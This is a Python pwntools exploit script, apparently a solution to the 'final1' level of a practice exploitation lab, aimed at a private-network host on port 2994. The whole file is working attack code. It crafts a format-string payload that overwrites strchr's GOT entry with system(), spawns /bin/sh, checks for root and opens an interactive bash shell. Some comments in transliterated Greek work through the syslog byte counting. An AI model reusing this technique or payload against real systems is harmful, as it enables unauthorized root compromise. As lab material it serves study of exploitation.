# Notes:
# * Attackers from different IP address or ports wit different length might have to
# adjust the payload with padding in order for the addresses to be aligned
# in the stack
#

from pwn import *

def read_prompt(conn):
    log.info("Reading prompt")
    return conn.recvpred(lambda all_bytes : all_bytes == b"[final1] $ ")

def read_login_failed(conn):
    log.info("Reading \"login failed\"")
    return conn.recvline_pred(lambda all_bytes : all_bytes == b"login failed\n")

# Configuration:
#
# Cause all of the data sent and received by a tube to be printed to the screen
# context.log_level = logging.DEBUG

got_plt__strchr = 0x0804a12c
system__addr = 0xb7ecffb0
system__addr_low  = 0x0000ffff & system__addr
system__addr_high = system__addr >> 16
system__addr_high = 0x00010000 | system__addr_high
assert(system__addr_high > system__addr_low)
assert(
    (
        ((system__addr_high & 0x0000ffff) << 16) |
        (system__addr_low)
    ) == (
        system__addr
    )
)

log.info("system__addr: " + hex(system__addr))
log.info(" - system__addr_low : " + hex(system__addr_low))
log.info(" - system__addr_high: " + hex(system__addr_high))

conn = remote("192.168.59.129", 2994)
attacker_ip   = conn.lhost # This is the attacking machine
attacker_port = conn.lport
log.info("Attacking from: " + attacker_ip + ":" + str(attacker_port) + " to " + conn.rhost + ":" + str(conn.rport))
read_prompt(conn)

# Username contains the addresses (in .got.plt) to which we will write
username = (b'AAAA')*2 + pack(got_plt__strchr, 32, 'little', False) + pack(got_plt__strchr+2, 32, 'little', False) + (b'AAAA')*2
log.info("Sending: username <username>")
conn.send(b'username ' + username + b'\n')
read_prompt(conn)

# Finding out if the prefix appended by syslog() is counted in the total number of characters.
# Egrapse sthn mnhmh                            0x7f == 127
# Emeis nomizoume oti grapsame:                 0x90 == 144
# Oi xarakthres einai sthn othonh einai:        0x9e == 158, dhladh oi: ##-!-##May  5 22:30:59 (none) final1: Login from 192.168.59.128:51966 as [AAAAAAAAxxxxAAAAAAAA] with password [0x41414141 0x41414141 0x804a12c 0x41414141 0x41414141 ##-!-##
# To syslog vazei                               0x1f == 31
# Omws 0x9e - 0x1f == 0x7f. Synepws to prefix pou vazei to syslog den prosmetrietai stous xarakthres pou grafondai
# Answer is: NO, the prefix from syslog() does not count towards printed characters.
bytes_written = len("Login from " + attacker_ip + ":" + str(attacker_port) + " as [")
bytes_written += len(username)
bytes_written += len("] with password [")

# With "passsword" variable we will write our target values
password = b''

# First we calculate the number of already written bytes
for i in range(0, 6):
    skip = 16+i
    password += bytearray( ('0x%'+str(skip)+'$08x '), encoding='utf-8')
    bytes_written += 2 + 8 + 1 # 2 for prefix, 8 for word, 1 for postfix

# Pad the output until we reach our first target value
padding = system__addr_low - bytes_written
log.info("Bytes written before 1st padding: " + hex(bytes_written))
log.info(" - Padding with " + hex(padding) + " bytes in order to reach target value: " + hex(system__addr_low))
password += bytearray(('%' + str(padding) + 'd'), encoding='utf-8')
bytes_written += padding
log.info(" - Bytes written after 1st padding: " + hex(bytes_written))

# Perform the first target write
password += b'%18$hn'

# Pad the output until we reach our second target value
padding = system__addr_high - bytes_written
log.info("Bytes written before 2nd padding: " + hex(bytes_written))
log.info(" - Padding with " + hex(padding) + " bytes in order to reach target value: " + hex(system__addr_high))
password += bytearray(('%' + str(padding) + 'd'), encoding='utf-8')
bytes_written += padding
log.info(" - Bytes written after 2nd padding: " + hex(bytes_written))

# Perform the second target write
password += b'%19$hn' # No overflow occurs, even though we have written more characters in the terminal. sys_log() handles it correctly and writes only 2 Bytes

# Send the arbitrary write payload
log.info("Sending: login <password>")
conn.send(b'login ' + password + b'\n')

read_login_failed(conn)
read_prompt(conn)

# Execute /bin/sh via strchr
log.info("Sending command")
conn.send(b'/bin/sh\x00' + b'\n')

log.info("Checking result")
conn.send(b'whoami\n')
response = conn.recvline().decode('ascii').strip()
if response == "root":
    log.success("Privilege Escalation Successful!")
    log.info("Switching to interactive bash")
    conn.send(b'bash -i\n')
else:
    log.failure("Privilege Escalation Failed!")

conn.interactive()
conn.close()
